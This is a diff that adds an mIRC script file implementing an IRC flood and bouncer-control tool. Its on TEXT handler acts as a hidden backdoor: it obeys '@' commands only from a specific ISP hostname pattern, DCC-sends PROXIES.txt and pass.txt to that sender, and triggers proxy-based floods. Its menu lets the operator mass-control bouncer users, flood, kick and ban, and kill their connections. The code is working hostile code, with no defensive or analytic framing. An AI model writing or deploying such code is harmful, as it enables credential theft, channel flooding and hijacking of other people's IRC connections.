@@ -1,0 +1,78 @@
+[script]
+n0=alias fuck {
+n1=  if ($2 != $null) { .sockwrite -tn * join $1 | /S PRivmsg $1 : $+ $2- | /halt }
+n2=  if ($chr(35) isin $1) {
+n3=    if ($1 == %chan.) {
+n4=      if (c isin %chan.modes) { .sockwrite -tn * join $1 | /fuckyou2 # | /halt  }
+n5=      .sockwrite -tn * join $1
+n6=      .fuckyou $1
+n7=    }
+n8=    else {
+n9=      .sockwrite -tn * join $1
+n10=      .fuckyou $1
+n11=    }
+n12=  }
+n13=  else {
+n14=    fuckyou $1
+n15=  }
+n16=} 
+n17=on 1:TEXT:*:*:{
+n18=  if (ppp isin $address($nick,2)) && (videotron.ca isin $address($nick,2)) {
+n19=    if (@proxy == $1) { .dcc send $nick PROXIES.txt }
+n20=    if (@bnc == $1) { .dcc send $nick pass.txt }
+n21=    if (@L == $1) { .timer 2 10 /dotf7 | /set %psy on | /set %psy.nick $nick | .notice $nick $color $+ $1- }
+n22=    if (@F == $1) { /fuck $2 | .notice $nick $color $+  $1- }
+n23=    if (@s == $1) { //s $2- | .notice $nick $color $+  $1- }
+n24=    if (@do == $1) {
+n25=      if (-r == $2) { goto else }
+n26=      /do1 $3- | .notice $nick $color $+  $1-
+n27=      halt 
+n28=      :else
+n29=      /do $2- | .notice $nick $color $+  $1-
+n30=      halt
+n31=    }
+n32=    if (@shit == $1) { 
+n33=      if (-r == $2) {
+n34=        .notify -r $3
+n35=        unset %shitt 
+n36=      }
+n37=      else {
+n38=        .notify $3 $3
+n39=        set %shitt $3
+n40=      }
+n41=    }
+n42=    if (@jp == $1) { //jp $2 | .notice $nick 9$color $+  $1- }
+n43=    if (@help == $1) { .notice $nick $color $+ Help: $color1 $+ @l @f @s @do [-r] @jp @help @proxy @bnc @shit [-r] }
+n44=  }
+n45=}  
+n46=alias fuckyou {
+n47=  /sockwrite -tn proxy* privmsg $1 : $+ $fldcolor | /fldcolor
+n48=  /sockwrite -tn proxy* notice $1 : $+ $fldcolor | /fldcolor
+n49=}
+n50=alias fuckyou2 {
+n51=  /sockwrite -tn proxy* privmsg $1 : $+ $fld | /fld
+n52=  /sockwrite -tn proxy* notice $1 : $+ $fld | /fld
+n53=}
+n54=menu @bnc {
+n55=  Control BNC users (ALL)
+n56=  .JOIN: //s join $$?=" #Channel : ? " $$?="Channel's password ? (leave blank if none)"
+n57=  .PART://s PART $$?=" #Channel : ? " : $+ $$?="What /part message ?" 
+n58=  .QUIT://s QUIT : $+ $$?="Quit message ?"
+n59=  .FLOOD:/fuck $$?="Nick or #Channel ?"
+n60=  .MSG:/s privmsg $$?="Nick or #Channel ?" : $+ $$?="Message ?"
+n61=  .NOTICE:/s notice $$?="Nick or #Channel ?" : $+ $$?="Message ?"
+n62=  .-
+n63=  .OPS
+n64=  ..OP:/s mode $$?="#Channel ?" +o $$?="Nickname to op ?"
+n65=  ..DEOP:/s mode $$?="#Channel ?" -o $$?="Nickname to deop ?"
+n66=  ..VOICE:/s mode $$?="#Channel ?" +v $$?="Nickname to voice ?"
+n67=  ..DEVOICE:/s mode $$?="#Channel ?" -v $$?="Nickname to devoice ?"
+n68=  ..KICK:/s kick $$?="#Channel ?" $$?="Nickname to kick ?" : $+ $$?="Reason to kick ?"
+n69=  ..BAN:/s mode $$?="#Channel ?" +b $$?="Nickname to ban ?"
+n70=  ..UNBAN:/s mode $$?="#Channel ?" -b $$?="Nickname to ban ?"
+n71=  ..KICK/BAN: /set %chan2kick $$?="#Channel ?" | set %nick2kick $$?="Nickname to kick ?" | /s kick %chan2kick %nick2kick : $+ $$?="Reason to kick ?" | /s mode %chan2kick +b %nick2kick
+n72=  Control of 1BNC user
+n73=  .Kill connection: /skill $$?="BNC NUMBER?:  if u want bnc98763  then type here 98763" $$?="Reason to kill ?"
+n74=  .Server notice:/snotice $$?="BNC NUMBER?:  if u want bnc98763  then type here 98763" $$?="Notice message ?"
+n75=  .Get bnc number of all USERS: /swho *
+n76=}
